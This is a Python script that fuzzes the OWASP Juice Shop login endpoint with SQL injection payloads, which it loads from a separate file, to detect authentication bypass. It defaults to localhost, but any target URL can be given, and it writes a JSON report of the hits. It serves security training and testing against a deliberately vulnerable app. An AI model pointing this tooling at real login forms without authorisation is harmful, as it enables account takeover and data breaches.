#!/usr/bin/env python3
"""
Fuzzing script for OWASP Juice Shop login form
Searches for SQL injection vulnerabilities
"""

import requests
import json
import time
import sys
import os
from urllib.parse import urljoin

class JuiceShopFuzzer:
    def __init__(self, base_url="http://localhost:3000"):
        self.base_url = base_url
        self.login_endpoint = "/rest/user/login"
        self.session = requests.Session()
        self.results = []
        
    def load_payloads(self, filename="sql_payloads.txt"):
        """Load SQL injection payloads from file"""
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                payloads = [line.strip() for line in f if line.strip()]
            print(f"[+] Loaded {len(payloads)} payloads")
            return payloads
        except FileNotFoundError:
            print(f"[-] Error: {filename} not found")
            return []
    
    def test_payload(self, payload, field="email"):
        """Test a single payload against the login form"""
        url = urljoin(self.base_url, self.login_endpoint)
        
        # Create test data
        if field == "email":
            data = {
                "email": payload,
                "password": "test123"
            }
        else:
            data = {
                "email": "test@test.com", 
                "password": payload
            }
        
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "JuiceShopFuzzer/1.0"
        }
        
        try:
            response = self.session.post(
                url, 
                json=data, 
                headers=headers,
                timeout=10
            )
            
            # Analyze response
            result = {
                "payload": payload,
                "field": field,
                "status_code": response.status_code,
                "response_time": response.elapsed.total_seconds(),
                "content_length": len(response.content),
                "response_text": response.text[:500]  # First 500 chars
            }
            
            # Look for potential SQL injection indicators
            indicators = [
                "sqlite_version",
                "syntax error", 
                "sql error",
                "database error",
                "ORA-",
                "MySQL",
                "SQLite",
                "authentication",
                "token",
                "welcome",
                "login successful"
            ]
            
            response_lower = response.text.lower()
            found_indicators = [ind for ind in indicators if ind.lower() in response_lower]
            
            if found_indicators:
                result["indicators"] = found_indicators
                result["potential_vuln"] = True
                print(f"[!] POTENTIAL VULNERABILITY - Payload: {payload[:50]}...")
                print(f"    Status: {response.status_code}, Indicators: {found_indicators}")
            else:
                result["potential_vuln"] = False
                
            # Special check for successful authentication bypass
            if response.status_code == 200 and ("token" in response_lower or "welcome" in response_lower):
                result["auth_bypass"] = True
                print(f"[!!!] AUTHENTICATION BYPASS DETECTED - Payload: {payload}")
                
            return result
            
        except requests.exceptions.RequestException as e:
            print(f"[-] Request failed for payload {payload[:30]}...: {e}")
            return {
                "payload": payload,
                "field": field, 
                "error": str(e),
                "potential_vuln": False
            }
    
    def run_fuzzing(self, payloads_file="sql_payloads.txt"):
        """Run the fuzzing campaign"""
        print(f"[+] Starting fuzzing against {self.base_url}")
        
        # Load payloads
        payloads = self.load_payloads(payloads_file)
        if not payloads:
            print("[-] No payloads loaded, exiting")
            return
        
        # Test each payload in email field
        print(f"[+] Testing {len(payloads)} payloads in email field...")
        for i, payload in enumerate(payloads):
            print(f"[+] Testing payload {i+1}/{len(payloads)}: {payload[:30]}...")
            result = self.test_payload(payload, "email")
            self.results.append(result)
            time.sleep(0.1)  # Small delay to avoid overwhelming the server
        
        # Test some payloads in password field  
        print(f"[+] Testing top 10 payloads in password field...")
        for i, payload in enumerate(payloads[:10]):
            print(f"[+] Testing password payload {i+1}/10: {payload[:30]}...")
            result = self.test_payload(payload, "password")
            self.results.append(result)
            time.sleep(0.1)
    
    def generate_report(self, output_file="fuzz_results.json"):
        """Generate fuzzing report"""
        
        # Summary statistics
        total_tests = len(self.results)
        potential_vulns = [r for r in self.results if r.get("potential_vuln", False)]
        auth_bypasses = [r for r in self.results if r.get("auth_bypass", False)]
        
        report = {
            "summary": {
                "total_tests": total_tests,
                "potential_vulnerabilities": len(potential_vulns),
                "authentication_bypasses": len(auth_bypasses),
                "target_url": self.base_url
            },
            "vulnerabilities": potential_vulns,
            "auth_bypasses": auth_bypasses,
            "all_results": self.results
        }
        
        # Save report
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        # Print summary
        print(f"\n[+] FUZZING COMPLETE")
        print(f"[+] Total tests: {total_tests}")
        print(f"[+] Potential vulnerabilities: {len(potential_vulns)}")
        print(f"[+] Authentication bypasses: {len(auth_bypasses)}")
        print(f"[+] Report saved to: {output_file}")
        
        if potential_vulns:
            print(f"\n[!] POTENTIAL VULNERABILITIES FOUND:")
            for vuln in potential_vulns:
                print(f"    - {vuln['payload'][:50]} (Field: {vuln['field']})")
        
        if auth_bypasses:
            print(f"\n[!!!] AUTHENTICATION BYPASSES FOUND:")
            for bypass in auth_bypasses:
                print(f"    - {bypass['payload']}")

def main():
    if len(sys.argv) > 1:
        base_url = sys.argv[1]
    else:
        base_url = "http://localhost:3000"
    
    print(f"[+] Juice Shop SQL Injection Fuzzer")
    print(f"[+] Target: {base_url}")
    
    fuzzer = JuiceShopFuzzer(base_url)
    fuzzer.run_fuzzing()
    fuzzer.generate_report()

if __name__ == "__main__":
    main()
